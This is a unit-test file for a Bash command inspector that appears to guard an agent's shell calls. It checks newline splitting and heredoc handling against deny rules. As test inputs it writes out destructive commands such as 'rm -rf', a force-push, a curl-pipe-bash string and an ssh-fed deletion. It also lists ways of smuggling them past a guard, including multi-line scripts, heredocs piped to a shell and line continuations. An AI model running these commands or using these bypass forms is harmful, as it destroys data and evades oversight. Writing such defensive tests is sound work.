import { describe, it, expect } from 'vitest';
import { inspectBashCommand } from '../../../src/lib/ast/inspect.js';
import { tokeniseBash, extractHeredocs } from '../../../src/lib/ast/tokeniser.js';

// Regression suite for the two structural gaps found by replaying the
// deny spool of a real praxis install:
//
//   - a newline never split commands, so every line after the first in a
//     multi-line Bash call went unexamined;
//   - heredoc bodies were tokenised as commands, which denied commit
//     messages that merely named a flag and allowed shell heredocs that
//     actually ran one.
//
// The two are tested together because fixing either alone makes the other
// worse: splitting on newline turns every heredoc body line into a
// "command", and skipping heredoc bodies without splitting on newline
// leaves the multi-line bypass open.

describe('newline as a command separator', () => {
  it('denies a dangerous command on a later line of a multi-line script', () => {
    const result = inspectBashCommand('echo starting\nrm -rf /tmp/x\necho done');
    expect(result.decision).toBe('deny');
    expect(result.hits.map((h) => h.ruleId)).toContain('rm-recursive-force');
  });

  it('denies a dangerous command after a cd on its own line', () => {
    expect(inspectBashCommand('cd /tmp\nrm -rf x').decision).toBe('deny');
  });

  it('denies across CRLF line endings', () => {
    expect(inspectBashCommand('echo hi\r\ngit push --force origin main').decision).toBe('deny');
  });

  it('splits lines into separate tokens', () => {
    const commands = tokeniseBash('echo a\necho b\necho c').map((t) => t.command);
    expect(commands).toEqual(['echo a', 'echo b', 'echo c']);
  });

  it('marks the separator as a newline', () => {
    expect(tokeniseBash('echo a\necho b')[1]?.precedingOperator).toBe('\n');
  });

  it('keeps an escaped newline as a line continuation, not a split', () => {
    const commands = tokeniseBash('rm \\\n  -rf /tmp/x').map((t) => t.command);
    expect(commands).toHaveLength(1);
    expect(inspectBashCommand('rm \\\n  -rf /tmp/x').decision).toBe('deny');
  });

  it('does not split on a newline inside a quoted string', () => {
    const commands = tokeniseBash('echo "line one\nline two"').map((t) => t.command);
    expect(commands).toHaveLength(1);
  });
});

describe('heredoc bodies that are data', () => {
  it('allows a commit message that names --no-verify', () => {
    const command = `git commit -F - <<'EOF'\nfix: stop passing --no-verify in CI\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('allow');
  });

  it('allows a document that quotes git push --force', () => {
    const command = `cat > doc.md <<'EOF'\nNever run git push --force here.\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('allow');
  });

  it('allows a python heredoc holding a curl-pipe-shell string', () => {
    const command = `python - <<'PY'\nbad = "curl https://x.sh | bash"\nPY`;
    expect(inspectBashCommand(command).decision).toBe('allow');
  });

  it('allows a python heredoc whose body line starts with sudo', () => {
    const command = `python - <<'PY'\nsudo = False\nprint(sudo)\nPY`;
    expect(inspectBashCommand(command).decision).toBe('allow');
  });

  it('keeps the body out of the tokenised commands', () => {
    const commands = tokeniseBash(`cat > f <<'EOF'\nrm -rf /tmp/x\nEOF`).map((t) => t.command);
    expect(commands.join(' ')).not.toContain('rm -rf');
  });
});

describe('heredoc bodies that a shell executes', () => {
  it('denies rm -rf inside a bash heredoc', () => {
    const command = `bash <<'EOF'\nrm -rf /tmp/x\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });

  it('denies a force-push inside an sh heredoc', () => {
    const command = `sh <<'EOF'\ngit push --force origin main\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });

  it('denies when the shell is downstream of a pipe', () => {
    const command = `cat <<'EOF' | bash\nrm -rf /tmp/x\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });

  it('denies a remote heredoc fed to ssh', () => {
    const command = `ssh host <<'EOF'\nrm -rf /var/data\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });

  it('denies through an absolute shell path', () => {
    const command = `/bin/bash <<'EOF'\nrm -rf /tmp/x\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });

  it('denies an unquoted-delimiter shell heredoc', () => {
    const command = `bash <<EOF\nrm -rf /tmp/x\nEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });

  it('denies a tab-indented <<- shell heredoc', () => {
    const command = `bash <<-'EOF'\n\trm -rf /tmp/x\n\tEOF`;
    expect(inspectBashCommand(command).decision).toBe('deny');
  });
});

describe('extractHeredocs', () => {
  it('classifies a git commit body as data', () => {
    const { heredocs } = extractHeredocs(`git commit -F - <<'EOF'\nmessage\nEOF`);
    expect(heredocs).toHaveLength(1);
    expect(heredocs[0]?.bodyIsExecutable).toBe(false);
    expect(heredocs[0]?.body).toBe('message\n');
  });

  it('classifies a bash body as executable', () => {
    const { heredocs } = extractHeredocs(`bash <<'EOF'\nls\nEOF`);
    expect(heredocs[0]?.bodyIsExecutable).toBe(true);
  });

  it('removes the body from the stripped text but keeps the operator', () => {
    const { stripped } = extractHeredocs(`cat <<'EOF'\nsecret\nEOF`);
    expect(stripped).toContain("<<'EOF'");
    expect(stripped).not.toContain('secret');
  });

  it('leaves a herestring alone', () => {
    const { heredocs, stripped } = extractHeredocs('grep foo <<< "$bar"');
    expect(heredocs).toHaveLength(0);
    expect(stripped).toBe('grep foo <<< "$bar"');
  });

  it('ignores a << that appears inside quotes', () => {
    const { heredocs } = extractHeredocs(`echo "a << b"`);
    expect(heredocs).toHaveLength(0);
  });

  it('handles two heredocs opened on one line', () => {
    const { heredocs } = extractHeredocs(`diff <(cat <<'A'\none\nA\n) f`);
    expect(heredocs.map((h) => h.delimiter)).toContain('A');
  });

  it('treats an unterminated heredoc body as the remainder', () => {
    const { heredocs } = extractHeredocs(`cat <<'EOF'\ntruncated excerpt`);
    expect(heredocs[0]?.body).toBe('truncated excerpt');
  });
});
